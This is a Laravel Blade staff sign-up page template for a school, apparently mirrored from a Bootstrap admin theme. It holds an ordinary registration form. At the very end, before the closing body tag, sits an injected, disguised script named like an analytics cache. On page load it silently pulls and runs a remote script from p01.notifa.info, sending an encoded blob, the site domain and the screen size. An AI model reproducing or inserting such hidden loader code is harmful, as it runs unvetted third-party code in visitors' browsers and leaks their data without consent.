<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signup.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>SMK Mahaputra-Register Staff</title>
  <!--favicon-->
  <link rel="icon" href="{{asset('assets/images/favicon.ico')}}" type="image/x-icon">
  <!-- Bootstrap core CSS-->
  <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="{{asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="{{asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Custom Style-->
  <link href="{{asset('assets/css/app-style.css')}}" rel="stylesheet"/>
  
</head>

<body>
 <!-- Start wrapper-->
 <div id="wrapper">
    <div class="card border-primary border-top-sm border-bottom-sm card-authentication1 mx-auto my-4 animated bounceInDown">
        <div class="card-body">
         <div class="card-content p-2">
          <div class="text-center">
                <img src="{{asset('assets/images/mahaputra.JFIF')}}">
            </div>
          <div class="card-title text-uppercase text-center py-3">Sign Up</div>
            <form method="POST" action="{{ route('register') }}" id="submitForm">
                @csrf
              <div class="form-group">
               <div class="position-relative has-icon-left">
                  <label for="exampleInputName" class="sr-only">Name</label>
                  <input type="text" id="exampleInputName" class="form-control form-control-rounded @error('usr_name') is-invalid @enderror" placeholder="Name" name="usr_name" value="{{ old('usr_name') }}" >
                    @error('usr_name')
                        <span class="invalid-feedback" role="alert">
                            <strong>{{ $message }}</strong>
                        </span>
                    @enderror
                  <div class="form-control-position">
                      <i class="icon-user"></i>
                  </div>
               </div>
              </div>
              <div class="form-group">
               <div class="position-relative has-icon-left">
                  <label for="exampleInputEmailId" class="sr-only">Email Address</label>
                  <input type="text" id="exampleInputEmailId"class="form-control form-control-rounded @error('usr_email') is-invalid @enderror" placeholder="Email Address"  name="usr_email" value="{{ old('usr_email') }}">
                  <div class="form-control-position">
                      <i class="icon-envelope-open"></i>
                  </div>
                   @error('usr_email')
                        <span class="invalid-feedback" role="alert">
                            <strong>{{ $message }}</strong>
                        </span>
                    @enderror
               </div>
              </div>
              <div class="form-group">
               <div class="position-relative has-icon-left">
                  <label for="exampleInputEmailId" class="sr-only">Phone Number</label>
                  <input type="text" id="usr_phone" value="{{ old('usr_phone') }}"class="form-control form-control-rounded @error('usr_phone') is-invalid @enderror" placeholder="Phone Number" name="usr_phone">
                    @error('usr_phone')
                        <span class="invalid-feedback" role="alert">
                            <strong>{{ $message }}</strong>
                        </span>
                    @enderror
                  <div class="form-control-position">
                      <i class="icon-phone"></i>
                  </div>
               </div>
              </div>
              <div class="form-group">
               <div class="position-relative has-icon-left">
                  <label for="exampleInputPassword" class="sr-only">Password</label>
                  <input type="password" id="exampleInputPassword" class="form-control form-control-rounded @error('password') is-invalid @enderror" placeholder="Password"  name="password">
                    @error('password')
                        <span class="invalid-feedback" role="alert">
                            <strong>{{ $message }}</strong>
                        </span>
                    @enderror
                  <div class="form-control-position">
                      <i class="icon-lock"></i>
                  </div>
               </div>
              </div>
              <div class="form-group">
               <div class="position-relative has-icon-left">
                  <label for="exampleInputRetryPassword" class="sr-only">Retry Password</label>
                  <input type="password" id="exampleInputRetryPassword" class="form-control form-control-rounded" placeholder="Retry Password" name="password_confirmation">
                  <div class="form-control-position">
                      <i class="icon-lock"></i>
                  </div>
               </div>
              </div>

              <div class="form-group">
               <div class="position-relative has-icon-left">
                <input type="hidden" name="role" value="3">
               </div>
              </div>

             <button type="submit" class="btn btn-primary shadow-primary btn-round btn-block waves-effect waves-light">Sign Up</button>
              <div class="text-center pt-3">
                <hr>
                <p class="text-muted">Already have an account? <a href="{{ route('login') }}"> Sign In here</a></p>
              </div>
             </form>
           </div>
          </div>
         </div>
    
     <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
    </div><!--wrapper-->
    
  <!-- Bootstrap core JavaScript-->
  <script src="{{asset('assets/js/jquery.min.js')}}"></script>
  <script src="{{asset('assets/js/popper.min.js')}}"></script>
  <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhGIPo3XfCO7NzFh%2bR4TNDzRRkmzfNjYBEvaH9PYWrTRLst0gOFrth%2b5%2bglwDMtd0b5zCWd17vzzhOpEuw6lAYJLz51ArrOOl8Y5SjZniMbiGG7ehzGvgxzMNS6uPTx4NZGMOhp%2biiQN98wF7PBI%2bb0GrGgCVCKQ0dbloBBvL2ab7jiRnWXkEkCN7LF8DoXa3CYAsn40pNJ9NGCiGJcDabb1TnBwqp8yKlYNfd7D7tJHpAKBbvvoknZZtmZEEFqyGz64b4RAzUVtY%2flEJUbQr555lVPEoOGy%2bbRuiUwsRGisTTwTHzjNr%2bqSyV%2blRSGujDRp1ph9bIzSGTIRng2ADGebgG2XfHhCmiWCwldmT%2bmdHJ9EQxkrc6Gf3tJcvjVb2d9mW7ALzjTiW0V9a%2b%2fKDQ%2fh6iF%2fRtq0tdYaBHJPGpZmRIO2geXKh4JuLo8AtaGSq3kCkKO38S%2fIoEDRNpBdrkY%2fd70RbUMnqyxrXpKkXjmqx6NWqzOgC22jlQYqhETIdE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signup.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
</html>





